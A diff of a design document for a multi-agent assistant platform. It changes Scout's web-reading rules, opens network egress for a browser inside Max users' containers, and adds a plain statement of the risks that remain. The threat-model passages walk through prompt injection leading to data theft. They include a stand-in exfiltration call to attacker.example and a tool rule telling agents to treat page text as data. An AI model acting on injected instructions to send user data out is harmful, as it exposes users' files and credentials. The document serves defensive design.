@@ -22,7 +22,7 @@
 8. Data model
 9. **Build phases** (hand these to the AI one at a time)
 10. Failures and security
-11. Proposal: Scout's browser (not built; the founder decides)
+11. Scout's browser (first version)
 
 ---
 
@@ -161,7 +161,7 @@ Decided 2026-10-03 (`docs/launch-plan.md` D7 and section 4). One lead and three 
 | `tex` | **Tex** | The lead: the agent the user texts. It plans the job, hands parts to specialists and answers the user | Everything the agent has today |
 | `byte` | **Byte** | Coding: writes and changes code, opens pull requests | Files, shell, git (through the git gateway), the platform tools |
 | `patch` | **Patch** | Code review: runs several reviewers (bugs, security, tests) | Read access to the code, shell for running tests and diffs, the platform tools for commenting |
-| `scout` | **Scout** | Research: searches the web and reads pages. **Only Scout searches the web.** On Max it will also drive a real browser (section 11) | One web search (the engine's own, or the platform's `web_search`: see "Web search" below), `read_page`, and the browser later. **No shell and no app actions** |
+| `scout` | **Scout** | Research: searches the web and reads pages. **Only Scout searches the web.** On Max it also drives a real browser, inside the user's own container (section 11) | One web search (the engine's own, or the platform's `web_search`: see "Web search" below), `read_page`, and on Max the browser. **No shell and no app actions** |
 
 These ids are fixed. Both repos use them.
 
@@ -172,7 +172,7 @@ These ids are fixed. Both repos use them.
 - **Otherwise the platform's `web_search`,** backed by Brave (section 5.1). It is a **Max feature** (section 7.1) and costs **1 credit per search** (section 7.2). On Free and Pro the tool refuses with a message the agent can read.
 - **What that means on Free and Pro with Hermes** (the user's own API key, or Textcrew AI): Scout can't search. It can still read a page whose address the user gives it; `read_page` is free on every plan.
 - **Which search Scout is given** is set in the agent image (`vm-manager`), per engine. This repo only decides what the platform's tool does when it is called.
-- **Open:** the results of an engine's own search never pass through the platform, so they are not "seen" addresses and `read_page` refuses them today (section 5.1). Whether `read_page` may open them on Claude Code is for the founder to decide (`docs/launch-plan.md` section 2).
+- **Reading what the engine's own search found** (decided 2026-10-04, after the first live run). The results of an engine's own search never pass through the platform, so they are not "seen" addresses. On the server, Scout searched with Claude Code's built-in search and `read_page` then refused every result. So **on Claude Code `read_page` opens any public address; on Hermes the seen-address rule stays** (section 5.1 says why the two differ, and section 10.3 what that leaves open).
 
 **In the agent image** (`vm-manager`, not this repo):
 
@@ -181,17 +181,18 @@ These ids are fixed. Both repos use them.
 - **Hermes:** the lead gets the same role prompts to use with its built-in delegation, one level deep.
 - **How many at once:** at most 3 specialists per job to start with.
 - **Why Scout has so few tools:** text from a web page is not trusted. Scout can't run commands or use the user's apps, so a page can't make it send or delete anything.
-- **Known limit on Hermes** (from the agent-image work, 2026-10-04): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction in the role prompt. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The controls that hold on both engines are on the platform: approvals for risky app actions, and the seen-address rule of `read_page` (section 5.1).
+- **Known limit on Hermes** (from the agent-image work, 2026-10-04): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction in the role prompt. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The control that holds on both engines is on the platform: approvals for risky app actions. The seen-address rule of `read_page` (section 5.1) is the platform's second control on Hermes, where the tool lists don't hold; on Claude Code it was given up for the tool lists (decided 2026-10-04).
 
 **On the platform** (this repo):
 
-- **Crew list:** `GET /v1/crew` returns the four members (id, name, lead or specialist, role, description, whether it is available yet), so the apps don't hard-code them. Scout also carries `browser`: the plan it needs (Max) and whether it is built yet (not yet). Scout's description says what needs Max (web search through Textcrew, and the browser) and what doesn't (the search built into the user's own Claude plan).
+- **Crew list:** `GET /v1/crew` returns the four members (id, name, lead or specialist, role, description, whether it is available yet), so the apps don't hard-code them. Scout also carries `browser`: the plan it needs (Max), whether this deployment has it (`available`, the setting `BROWSER_AVAILABLE`) and whether it is on for this user (`enabled`: the deployment has it and the user is on Max). Section 11.5. Scout's description says what needs Max (web search through Textcrew, and the browser) and what doesn't (the search built into the user's own Claude plan).
   - **Available yet?** The specialists live in the agent image, and the backend can't see which image is deployed. The setting `CREW_AVAILABLE` lists the specialists that are switched on (default `byte,patch,scout`). Tex is always available.
 - **Progress lines:** when a specialist starts or finishes, the Bridge sends a progress event whose text starts with the member's name and a colon, for example `Scout: reading 4 pages`.
   - **Web chat:** the worker passes every progress line of a turn to the live stream as `agent.progress` (the text, the crew member if the line names one, the time). Lines without a name, such as `using web_search`, go the same way with no member.
   - **Telegram and other chats:** nothing is sent for a progress line. A chat only gets what the agent itself sends with `send_message`, as before, so the user isn't spammed.
   - **Activity log:** a line that names a crew member is also saved (`crew_progress`, with the member), so the activity page shows who did what. At most 30 per turn; the text is cut at 300 characters.
-- **Scout's platform tools run on the platform,** not in the container: `web_search` (Max only) and `read_page` on the Platform MCP (section 5.1). The container's network stays locked.
+- **Scout's platform tools run on the platform,** not in the container: `web_search` (Max only) and `read_page` on the Platform MCP (section 5.1). They don't open the container's network. **The browser is different:** it runs in the container, and a container with the browser on can reach any public website (sections 4, 10.3 and 11).
+- **The browser switch:** the platform turns the browser on for Max users and off for everyone else, through the vm-manager (section 11.3).
 - **Pull-request review** uses Patch (section 0.8).
 
 ### 0.8 Pull-request review
@@ -372,7 +373,7 @@ The limits are the same on every plan.
   - **It is a safety net, not a guarantee.** A short password in a plain sentence ("the door code 4821"), a secret in another language, or one split in two passes. It also refuses some harmless text ("the wifi password is on the fridge"); the agent is told to say it without the secret.
 - **Per user, never across users.** Every query filters by the user id, and the tools take the user id only from the container token (section 0.1). A memory id of another user answers "not found", for `forget` and for the web app's delete alike. Tested.
 - **Nothing leaves the platform through memory:** memories go only to the user's own container and the user's own web app.
-- **A web address inside a memory is not a "seen" address for `read_page`** (section 5.1). Only the user's own messages, search results and links on read pages count. Otherwise an injected agent could save an address with the user's data in it and then read it. Tested.
+- **A web address inside a memory is not a "seen" address for `read_page`** (section 5.1; the rule applies on Hermes). Only the user's own messages, search results and links on read pages count. Otherwise an injected agent could save an address with the user's data in it and then read it. Tested.
 
 **The engines' own memory is left as it is.** Hermes still learns into `/data/hermes` and Claude Code keeps its own files (section 0.5). Those stay per engine and are not copied, read or cleared by the platform. **Platform memory is the shared one:** it is what survives an engine switch, and the only one the user can see and delete from the web app.
 
@@ -425,15 +426,16 @@ The limits are the same on every plan.
 
 | RPC | Type | Purpose |
 |---|---|---|
-| CreateSandbox | unary | New container + volume + tokens (stays stopped) |
+| CreateSandbox | unary | New container + volume + tokens (stays stopped). Carries whether the browser is on (section 11) |
 | WakeSandbox | unary | Start if needed, wait for the Bridge to be healthy |
 | **Deliver** | **server-streaming** | Send a message or approval answer; stream events *accepted → working → turn_done / error* |
 | Touch | unary | Refresh last-active |
 | StopSandbox | unary | Polite stop (force flag for stuck turns) |
 | DeleteSandbox | unary | Remove container, volume, egress rules |
 | GetSandbox / ListSandboxes | unary | State, last active, resource use |
-| GetUsage | unary | Awake periods per user since a time (for credits) |
+| GetUsage | unary | Awake seconds and browser seconds per user in a time window (for credits) |
 | SetEgressAllowlist | unary | The user's MCP domains changed |
+| SetBrowser | unary | Turn Scout's browser on or off for one user's container; it takes effect on the next wake (section 11) |
 | SnapshotVolume | unary | Archive /data for backup |
 
 **Auth on gRPC:** a shared secret in metadata; only the platform network can reach the port. Mutual TLS later.
@@ -503,14 +505,18 @@ The web app lives in `user-frontend/` and is built from `openapi.yaml` + `ignore
 |---|---|---|
 | **edge** | Caddy, api | Only Caddy (80/443) |
 | **platform** | api, worker, vm-manager, Postgres, Redis, LiteLLM, egress proxy | No |
-| **sandbox** (internal) | user containers, egress proxy, vm-manager | No |
+| **sandbox** (internal) | user containers, egress proxy, vm-manager | No, except through the egress proxy: a short fixed list for every container, and **any public website for a container with Scout's browser on** (Max plan, section 11) |
 
 **Rules:**
 - The internet reaches only Caddy → api.
 - **`/mcp` and `/git` are not reachable from the internet.** Caddy answers 404 for `/mcp*` and `/git/*`. Only user containers need those two paths, and they reach the api directly on the platform network through the egress proxy, never through Caddy. Attachment URLs under `/mcp/files/` are built from the api's internal address (`INTERNAL_API_URL`), so nothing public depends on either path.
 - Containers reach **only the egress proxy**, which allows: LiteLLM, the api's `/mcp` and `/git/`, and that user's allowlisted MCP domains. `github.com` itself is **not** allowed.
+- **A container with the browser on is the exception** (decided 2026-10-04, `docs/launch-plan.md` D10). Scout's browser runs inside the user's container, and a browser must reach any site. So for a **Max user whose browser is on**, the way out is opened for that one container: **it can reach any public website.**
+  - **Who:** only containers the platform has switched the browser on for (`browser_enabled`, section 11.3): Max plan, and only when the server says the deployed agent image has the browser (`BROWSER_AVAILABLE`). Every other container stays locked as above. Leaving Max closes it again on the container's next wake.
+  - **What stays refused for every container, browser or not:** private, loopback, link-local and metadata addresses (`169.254.169.254`), and everything on the platform's networks beyond the three services named above (Postgres, Redis, the vm-manager, other users' containers). The vm-manager and the egress proxy enforce this; it is their side of the design (`vm-manager` repo).
+  - **What it costs** is in section 10.3: the container that holds the user's files, memory, cloned code and Claude sign-in now has a way out that the platform can't check.
 - The worker **never** talks to containers directly; it goes through the vm-manager's *Deliver*.
-- **Web research doesn't open the container's network.** Scout's `web_search` and `read_page` run in the api, which fetches for the agent and refuses private and internal addresses (section 5.1).
+- **`web_search` and `read_page` don't open the container's network.** They run in the api, which fetches for the agent and refuses private and internal addresses (section 5.1). They work the same on every plan's container. Only the browser needs the open network.
 - The vm-manager's gRPC port is on the platform network only.
 
 ---
@@ -532,7 +538,7 @@ The web app lives in `user-frontend/` and is built from `openapi.yaml` + `ignore
 | schedule_reminder / create_automation / list / cancel | Save + register the timer (plan limits apply) |
 | get_profile | Name, timezone, plan, connected apps |
 | web_search | Scout's search through the platform, for an engine with no web search of its own (section 0.7). **Max plan only:** on Free and Pro it refuses with a message for the agent. Asks the search provider (Brave) from the server and returns titles, links and snippets. **1 credit per successful search** (section 7.2) |
-| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. Only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read). Free, on every plan |
+| read_page | Scout's page reader. Fetches one public web page from the server and returns its text and links. On Claude Code: any public address. On Hermes: only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read). Free, on every plan |
 | remember | Saves one short fact about the user to the shared memory (section 0.9). Refused: a secret, more than 300 characters, more than 200 memories. Free |
 | recall | Finds the memories that fit a question, best match first; with no question, the latest. Free |
 | forget | Removes a memory, or corrects its text. Free |
@@ -541,9 +547,24 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
 
 - **What needs approval** (`integrations/catalog.ts`): an action whose name has a risky word (send, reply, delete, pay, share, post, merge, close, update…), and, since 2026-10-03, a **GitHub action that writes a comment or a review** (its name has COMMENT or REVIEW and it isn't a read). Other people read those, so they count as sending to others. Comment actions of other apps are unchanged.
 
-- **Scout's tools** (decided 2026-10-03, built 2026-10-04). They run in the api, never in the container, so the container's network stays locked.
+- **Scout's tools** (decided 2026-10-03, built 2026-10-04). They run in the api, never in the container, so they need no way out of the container.
   - **`read_page(url)`:**
-    - **Only an address that was already seen for this user** (decided 2026-10-04). `read_page` is the first way out of the container that needs no approval. Without a rule, one injected instruction (in a web page, an email, a file) could make any agent call `read_page("https://attacker.example/?d=<private data>")` and hand over the user's data, files or Claude sign-in. So the address must match, exactly after normalising, one the platform has seen for this user:
+    - **Which addresses it opens depends on the engine** (decided 2026-10-04, after the first live run):
+
+      | The turn runs on | `read_page` opens |
+      |---|---|
+      | **Claude Code** | **Any public address** |
+      | **Hermes** | **Only an address already seen for this user** (the rule below) |
+
+      - **What went wrong with one rule for both.** On the server, Scout searched with Claude Code's built-in web search and then `read_page` refused every result (`read_page_refused`): results of the engine's own search never pass through the platform, so none of them was a "seen" address. Scout could search and could not read.
+      - **Why Claude Code can be open.** On Claude Code the agent image lets **only Scout** call `read_page`: it is in Scout's tool list, it is denied to Byte and Patch, and a hook refuses the lead's own calls (`vm-manager` repo). **Scout has no files, no shell and no app tools.** So the one agent that can fetch any address holds only its task text and what it read on the web.
+      - **Why Hermes stays strict.** The pinned Hermes can't narrow tools per agent (section 0.7): the lead and every specialist have `read_page`, next to files, a shell and the user's apps. There the platform's check is the only one that holds.
+      - **How the platform knows the engine.** The platform can't tell which crew member calls: every call from a container carries the same container token. It does know the engine: when the worker delivers a turn it records, for that user, the engine the container really runs for it (after the wake; the engine comes from the user's settings, section 7.1), and removes the record when the turn ends. The record lasts 20 minutes at most (a turn is cut off at 15). `read_page` reads it. **No turn in progress, or the record can't be read: the strict rule.** The container can't choose its engine, and the user's settings change only from the user's own session.
+      - **On Claude Code a redirect is followed to any public address.** Every hop still goes through the address checks below.
+      - **Search results and page links are remembered on both engines,** so they are there when a user changes engine.
+      - **In the activity log** a page read at an address that had not been seen carries `seen: false` in the entry's details.
+      - **What the open rule leaves open** is in section 10.3. In short: the platform trusts the agent image's tool lists, and can't check them.
+    - **The seen-address rule (Hermes)** (decided 2026-10-04). `read_page` is a way out of the container that needs no approval. Without a rule, one injected instruction (in a web page, an email, a file) could make any agent call `read_page("https://attacker.example/?d=<private data>")` and hand over the user's data, files or Claude sign-in. So the address must match, exactly after normalising, one the platform has seen for this user:
       - **(a)** an address in the **user's own messages**: their last 100 messages from the past 7 days, on any chat. Only what the user wrote counts. The agent's own messages, automation instructions (the agent writes those) and app events (an email's text) do not;
       - **(b)** a **result of `web_search`**;
       - **(c)** a **link on a page `read_page` already returned.** The tool returns a page's first 50 links for this reason.
@@ -552,17 +573,17 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
       - **Redirects follow the same rule.** A redirect is followed only to an address that was seen, or to the same address in another spelling (`http` to `https`, with or without `www.`). Any other redirect is refused, on the same site too. This is stricter than the leak needs (a redirect's target is chosen by the site, not by the agent) and it costs some pages; it is the careful starting point and can be loosened to "same site" later.
       - **Where it is kept:** (b) and (c) in Redis, one set per user, for 24 hours, at most 500 addresses (the oldest go first). (a) is read from the user's messages when asked, so nothing is stored twice.
       - **What it does not stop.** A hostile page can offer many links, and an injected agent can signal a little by which one it opens: a few bits per read, at most 30 reads a minute. The caps (50 links a page, 500 addresses) keep that slow and the activity log shows every read. Search queries go to the search provider, not to a site.
-      - **Why this rule is the one that matters:** on Claude Code, Scout's "search and read only" limit is enforced by its tool list. On Hermes it is only an instruction (section 0.7), and the lead and the other specialists have `read_page` on both engines. This check is on the platform, so it holds for every agent on both.
+      - **Why this rule is the one that matters on Hermes:** Scout's "search and read only" limit is only an instruction there (section 0.7), and the lead and the other specialists have `read_page` too. This check is on the platform, so it holds for every Hermes agent.
       - **Known cost:** an automation that reads a fixed page ("every morning read this page") works while the link is in the user's recent messages. After that the agent must find the page by search or ask for the link again. Keeping such links with the automation is not built.
     - **Only `http` and `https`,** on ports 80 and 443, with no user name or password in the URL.
-    - **Only public addresses.** The host is looked up, and the page is refused if **any** of its addresses is private, loopback, link-local (this covers the cloud metadata address `169.254.169.254`), carrier NAT, multicast, reserved, or the IPv6 forms of those (only global IPv6 addresses pass; IPv4 written inside an IPv6 address is refused). Host names with no dot, `localhost`, `.local`, `.internal`, and the platform's own hosts (the api, LiteLLM, the vm-manager, taken from the settings) are refused by name. A host written as a number is checked as the address it is.
+    - **Only public addresses, on both engines.** The host is looked up, and the page is refused if **any** of its addresses is private, loopback, link-local (this covers the cloud metadata address `169.254.169.254`), carrier NAT, multicast, reserved, or the IPv6 forms of those (only global IPv6 addresses pass; IPv4 written inside an IPv6 address is refused). Host names with no dot, `localhost`, `.local`, `.internal`, and the platform's own hosts (the api, LiteLLM, the vm-manager, taken from the settings) are refused by name. A host written as a number is checked as the address it is.
     - **Checked again when connecting.** The connection is made only to the address that passed the check (the request is pinned to it; the host name is still used for the certificate), so a host can't answer "public" to the check and "private" to the connection (DNS rebinding). Every request opens its own connection.
-    - **Redirects** are followed by hand, at most 5, and every hop is checked the same way from the start: the address checks here and the seen-address rule above.
+    - **Redirects** are followed by hand, at most 5, and every hop is checked the same way from the start: the address checks here, and on Hermes the seen-address rule above.
     - **Limits:** 15 seconds in total, 2 MB of page (a longer page is read up to 2 MB and marked as cut), text types only (HTML, plain text, JSON, XML). The answer is the page's readable text (scripts, styles and markup removed), cut at 20,000 characters.
     - **What is sent:** a plain GET with a fixed user agent. No cookies, no sign-in, nothing about the user.
     - **Rate limit:** 30 pages a minute per user.
     - **The text is not trusted.** The tool's description tells the agent to treat it as information, never as instructions. Scout has no shell and no app actions (section 0.7).
-    - The activity log saves the page's address without its query string. A refused address is written to the activity log too (`read_page_refused`) and to the server log, also without its query string: a refusal can be an injected instruction at work, and the user should be able to see it.
+    - The activity log saves the page's address without its query string. A refused address is written to the activity log too (`read_page_refused`) and to the server log, also without its query string: a refusal can be an injected instruction at work, and the user should be able to see it. On Claude Code only the address checks refuse (a private or internal address); on Hermes an unseen address does too.
     - `robots.txt` is not read: this is one page fetched for one user's question, not a crawler.
   - **`web_search(query)`:**
     - **When it is used** (decided 2026-10-04): only when the user's engine has no web search of its own (section 0.7). The platform doesn't check the engine. A Max user's call is answered and charged whichever engine made it; giving Scout the right search is the agent image's job.
@@ -598,14 +619,15 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
 
 | Job (queue) | What happens |
 |---|---|
-| process-message (inbound) | Take the lock → channel still on? (section 0.3) → **credit check** (section 7.5) → Jev: simple or task, apps, spam → simple: cheap model via LiteLLM → outbound; task: *WakeSandbox* → *Deliver* (stream until turn done). The delivered text starts with the memory block, and with a recap of the chat when the engine changed (section 0.9). Progress lines from the stream go to the web chat's live stream (section 0.7) |
+| process-message (inbound) | Take the lock → channel still on? (section 0.3) → **credit check** (section 7.5) → Jev: simple or task, apps, spam → simple: cheap model via LiteLLM → outbound; task: *WakeSandbox* → browser switch checked against the plan (section 11.3) → *Deliver* (stream until turn done). While the turn runs, its engine is on record for `read_page` (section 5.1). The delivered text starts with the memory block, and with a recap of the chat when the engine changed (section 0.9). Progress lines from the stream go to the web chat's live stream (section 0.7) |
 | process-approval (inbound) | Mark the approval → Wake + Deliver the answer (with the memory block and the recap, like any turn) |
 | run-automation (scheduled → inbound) | Same as process-message with the saved instruction |
 | composio-trigger (inbound) | Same as process-message with the event summary. For a pull-request review automation: check the event, find the head commit, one review per head commit, then the review instruction (section 0.8) |
 | send-outbound (outbound) | Send via the channel (24-hour rule → template). Nothing is sent to a channel that is switched off. On Telegram, purchase links are taken out (section 7.6) |
-| create-sandbox / delete-sandbox (system) | LiteLLM key create/revoke + vm-manager Create/Delete. Deleting a user also removes their memories and messages |
+| create-sandbox / delete-sandbox (system) | LiteLLM key create/revoke + vm-manager Create/Delete. A new container is created with the browser on or off, by plan (section 11.3). Deleting a user also removes their memories and messages |
+| sync-browser (system) | Added when a user's plan changes. Works out from the plan and the setting whether the browser should be on, and tells the vm-manager (*SetBrowser*). Safe to re-run: it sends the wanted state, not a change. No container yet: nothing to do (section 11.3) |
 | check-connection (system) | Added when a connect link is created. Asks Composio for the account's status 15 s later, then after 30 s, 1 min, 2 min, 4 min and 8 min (six checks in about 16 minutes). It stops as soon as the connection is no longer `pending`. Safe to re-run: it only copies Composio's status. After the last check a connection that is still pending is left as it is; the webhook or the app list can still finish it |
-| sync-usage (system, every 5 min) | LiteLLM spend + vm-manager *GetUsage* → **charges** (section 7.4) → enforce zero balance |
+| sync-usage (system, every 5 min) | LiteLLM spend + vm-manager *GetUsage* (awake seconds and browser seconds) → **charges** (section 7.4) → enforce zero balance |
 | grant-monthly-credits (system) | On subscription renewal (Polar's paid renewal order) → a new monthly grant |
 | expire-credits (system, hourly) | Expire grants past their end date |
 | cleanup (system, daily) | Old events and messages, used link codes |
@@ -624,6 +646,7 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
 - create the container's **Platform MCP token** and **Bridge secret** (store only hashes)
 - write the Hermes config (LiteLLM URL + the user's key, Platform MCP URL + token)
 - write the egress allowlist
+- note whether Scout's browser is on for this user (`browser_enabled`, from the backend; section 11)
 - leave it stopped
 
 **Container settings:**
@@ -652,6 +675,8 @@ Every call is audit-logged and triggers a vm-manager *Touch*. `/mcp` is closed t
 
 A timeout (15 min) ends in a force-stop and an error event.
 
+**Scout's browser** (section 11). The vm-manager keeps `browser_enabled` per container. The backend sets it at *CreateSandbox* and changes it with *SetBrowser*; a change takes effect on the container's next wake. A container with the browser on gets the open way out of section 4. The seconds the browser was in use are kept with each awake period and returned by *GetUsage* as `browser_seconds`.
+
 ---
 
 ## 7. Plans, credits and coupons
@@ -662,6 +687,7 @@ _Updated 2026-09-29 to match the pricing page: Max $30, automations 1 / 5 / 50, 
 _Updated 2026-10-03 with the launch decisions (`docs/launch-plan.md`): AI three ways, 1 credit per app action that changes something, no purchase links on Telegram. Prices and credits are unchanged._
 _Updated 2026-10-03 (crew package): browser use is a Max feature, a user can choose Textcrew AI over their own AI, web search is the first paid tool._
 _Updated 2026-10-04 (search and browser decisions, `docs/launch-plan.md` D6, D7, D10): Scout's web search through Textcrew is a Max feature too and costs 1 credit per search; the search built into the user's own engine is free on every plan; the browser will allow logins (section 11)._
+_Updated 2026-10-04 (the browser, first version): Scout's browser runs inside the user's own container, on Max, at 2 credits per minute; signing in to sites is the next step (section 11)._
 
 | | **Free** | **Pro** | **Max** |
 |---|---|---|---|
@@ -673,13 +699,13 @@ _Updated 2026-10-04 (search and browser decisions, `docs/launch-plan.md` D6, D7,
 | Apps (Composio) | 10 | All 25 | All 25 + **own MCP servers** |
 | Automations (a repo with pull-request review on counts as one) | 1 | 5 | 50 |
 | Web search through Textcrew (Scout's `web_search`, backed by Brave; 1 credit per search) | – | – | ✓ |
-| Browser use (Scout's real browser, 2 credits per minute; not built yet, section 11) | – | – | ✓ |
+| Browser use (Scout's real browser, inside the user's container; 2 credits per minute; section 11) | – | – | ✓ |
 | Bring your own key | ✓ | ✓ | ✓ |
 | Awake cap priority | Lowest (stopped first when the server is full) | Normal | Highest |
 
 **Scout's two platform services are Max only** (decided 2026-10-04): web search through Textcrew, and the real browser.
 
-- **On Free and Pro** the `web_search` tool refuses with a clear message (section 5.1). Nothing is charged.
+- **On Free and Pro** the `web_search` tool refuses with a clear message (section 5.1). Nothing is charged. **The browser is switched off** in a Free or Pro user's container (section 11.3), so there is nothing to refuse.
 - **Not a plan feature:** the web search built into the user's own engine (Claude Code on their Claude plan today; Codex later). Scout uses it on every plan, at no credits, and the platform is not involved (section 0.7).
 - **`read_page` is on every plan,** and free.
 
@@ -715,7 +741,7 @@ _Updated 2026-10-04 (search and browser decisions, `docs/launch-plan.md` D6, D7,
 | App action that only reads (get, list, search) | Free |
 | **Web search through Textcrew** (`web_search`, backed by Brave) | **1 credit per successful search** (Max plan) |
 | Web search built into the user's own engine (Claude Code on their Claude plan; Codex later) | Free. It runs on the user's own plan; the platform is not involved |
-| Browser use | 2 credits per minute (Max plan; not built yet, proposal in section 11) |
+| Browser use (Scout's real browser) | 2 credits per minute of browser time (Max plan; section 11.4). Awake time is charged as well while the browser runs |
 | Other paid tools (pay-per-use APIs) | Their cost × 2.5. None yet besides web search |
 | Reading a web page (`read_page`) | Free |
 | Jev routing, simple replies | Included in the AI cost |
@@ -771,7 +797,7 @@ Credits are held as **grants**. Each grant has an amount, **what's left of it**,
 
 ### 7.4 Charging (how usage becomes charges)
 
-1. **Every 5 minutes**, *sync-usage* reads new AI spend per user from LiteLLM and new awake periods from the vm-manager.
+1. **Every 5 minutes**, *sync-usage* reads new AI spend per user from LiteLLM, and new awake seconds and browser seconds from the vm-manager (*GetUsage*).
 2. It turns them into credits (section 7.2) and writes **one charge per user per sync**, with a unique key per (user, period), so a re-run can't double-charge.
 3. The charge is taken from grants in the spending order, and the ledger records each part.
 4. **After each turn** (on *turn done*), the worker also does a quick sync for that user, so the balance stays fresh.
@@ -779,6 +805,7 @@ Credits are held as **grants**. Each grant has an amount, **what's left of it**,
 
 6. **Paid tools are charged when they run** too, the same way: one charge per successful call, with its own unique key, through the same grants and ledger (`Web search`, 1 credit). It shows in the credit history, in the activity log (`creditsCharged`) and in usage (`toolCredits`).
 7. **Usage is reported in five parts:** AI, awake time, app actions, browser time and paid tools (`aiCredits`, `awakeCredits`, `appActionCredits`, `browserCredits`, `toolCredits`). Browser time has its own number so screens can label it; the total is the sum of the five.
+8. **Browser time is charged by the sync,** like awake time (section 11.4): **30 seconds of browser time is 1 credit** (2 credits per minute). Part minutes carry over between syncs, so nothing is rounded up and nothing is lost. It is part of the one charge per user per period, so a re-run can't charge it twice. Each usage period keeps its `browserSeconds` and `browserCredits`.
 
 ### 7.5 Enforcing the balance
 
@@ -788,6 +815,7 @@ Credits are held as **grants**. Each grant has an amount, **what's left of it**,
 | **During a turn** | The user's **LiteLLM key budget = their current balance in dollars of real cost**. If they run out mid-turn, LiteLLM refuses → Hermes stops → "out of credits" |
 | **Before a web search through Textcrew** | On the Max plan? If not → the tool tells the agent that web search is part of Max, and to use the engine's own search if it has one. The search does not run and nothing is charged |
 | **Before an app action that changes something, or a paid tool** | Balance > 0? If not → the tool tells the agent the user is out of credits and the action or search does not run |
+| **The browser** | No check of its own. The browser only runs inside a turn, and a turn does not start at zero credits (first row): the container is not woken. Inside a turn it is not cut off; the turn is (15 minutes at most), and the overrun is recovered from the next grant |
 | **At zero after a sync** | Set the LiteLLM budget to 0; pause automations |
 | **When credits are added** (payment, coupon, monthly grant) | Raise the LiteLLM budget; un-pause automations |
 
@@ -1023,6 +1051,8 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 | GitHub can't be asked for a pull request's head commit | The head commit in the event is used; with none, no review runs and the activity log says why |
 | A review's job runs out of retries (vm-manager down for minutes) | The commit stays claimed by that event, so no later event reviews it twice. It is reviewed if that event's job is run again; otherwise the next push gets its own review |
 | vm-manager down | Wake/Deliver jobs retry with backoff; the rest keeps working |
+| The browser switch can't be sent (vm-manager down when a plan changes) | The *sync-browser* job retries with backoff. If it runs out of tries, the next turn sees the difference after the wake and sends the switch again; it takes effect on the wake after that |
+| The engine of a turn can't be recorded or read (Redis) | `read_page` uses the strict seen-address rule: the safe side |
 | Memory or the chat history can't be read when a turn starts | The turn is delivered without the memory block or the recap; a warning is logged |
 | Jev down | Treat every message as a task (no routing shortcut) |
 | Polar webhook late | Credits are added when it arrives; the web app shows "processing" |
@@ -1032,127 +1062,185 @@ A small negative balance (one turn's overrun) is allowed and recovered from the 
 - [ ] Only Caddy is exposed; every other service is on the private networks from section 4; `/mcp` and `/git` answer 404 from outside
 - [ ] Every webhook is verified before parsing and deduplicated
 - [ ] The Docker socket is mounted **only** in the vm-manager
-- [ ] Containers: gVisor, limits, read-only files, sandbox network, egress allowlist, only their own secrets
+- [ ] Containers: gVisor, limits, read-only files, sandbox network, egress allowlist, only their own secrets. The open way out exists only for a container with the browser on (Max); private, loopback, link-local, metadata and internal addresses are refused for every container (sections 4 and 10.3)
 - [ ] No Composio/provider/database keys in containers; the Platform MCP forces the user id from the token
 - [ ] No GitHub token in containers: git goes through the git gateway, which forces the user id from the container token and refuses pushes to the default branch
 - [ ] Secrets encrypted in Postgres; tokens and codes stored as hashes
 - [ ] Approvals before sending to others, deleting or paying; audit log for every action
 - [ ] Pull-request review: comments run without approval only on repos the user turned review on for, only the four named actions, never approve, merge, reply or another repo; the agent can't turn it on; the instruction carries no text from the pull request
 - [ ] `read_page` reaches public addresses only: private, loopback, link-local, metadata and internal hosts are refused, at every redirect and again when connecting; limits on time, size and redirects; rate limited
-- [ ] `read_page` can't be used to send data out: it fetches only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read), at every redirect too. An address the agent made up is refused. The future browser tools need the same rule for every navigation (section 11)
+- [ ] `read_page` on Hermes can't be used to send data out: it fetches only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read), at every redirect too. An address the agent made up is refused. The strict rule also applies whenever no turn is on record as running on Claude Code
+- [ ] `read_page` on Claude Code opens any public address (decided 2026-10-04): the agent image lets only Scout call it there, and Scout has no files, no shell and no app tools. The platform can't check which agent calls (section 10.3)
+- [ ] Scout's browser: on only for Max users, and only when `BROWSER_AVAILABLE` is on; off again after the user leaves Max; charged per second through the usage sync; no wake at zero credits (section 11)
 - [ ] Shared memory: per user only (the user id comes from the container token; another user's memory id answers "not found"); a memory is one line and can't write the block's own lines; the block says its notes are data and can't approve anything; obvious secrets are refused when saving; no memory text in the audit log; deleted with the account (section 0.9)
 - [ ] Coupon rules from 7.7; rate limits on redeem, link codes and login-linked endpoints
 - [ ] Nightly off-server backups with a tested restore
 
+### 10.3 What is open, said plainly
+
+Two decisions of 2026-10-04 each give up a check the platform had: Scout's browser inside the container (section 11), and `read_page` opening any public address on Claude Code (section 5.1). This section says what each one leaves open.
+
+**1. A Max user's container with the browser on can reach any public website.**
+
+That container holds:
+
+- the user's **files** in `/data`, and the **code** it cloned;
+- the engine's own **memory** and chat sessions. The shared memory lives on the platform, but its block is put at the top of every turn (section 0.9), so the agent has it;
+- **git access** to the user's GitHub repos through the git gateway (clone, fetch, push to branches);
+- the user's **Claude sign-in**, when they connected their Claude plan: Claude Code keeps its credentials in `/data`;
+- the container's own secrets: its Platform MCP token, its Bridge secret, the user's LiteLLM key, and on Max the secrets of the user's own MCP servers.
+
+Before the browser, nothing in that container had a way out that the platform did not check. With the browser on, **anything running in it can send any of that to any public site.** One injected instruction is enough: in a web page Scout reads, an email, a pull request's code, a file.
+
+**What still limits the damage:**
+
+- **One user, one container.** It is that user's data only. The container is sandboxed (gVisor), holds no other user's data, and the platform takes the user id from the container's token, never from what an agent says.
+- **The keys that matter most never enter a container:** Composio's, the model providers', the database's, and the GitHub token (the git gateway keeps it). A leak can't act in the user's apps by itself.
+- **Approvals still hold.** Sending to other people, deleting and paying need the user's approval on the platform (section 5.1). An injected agent can't approve its own request.
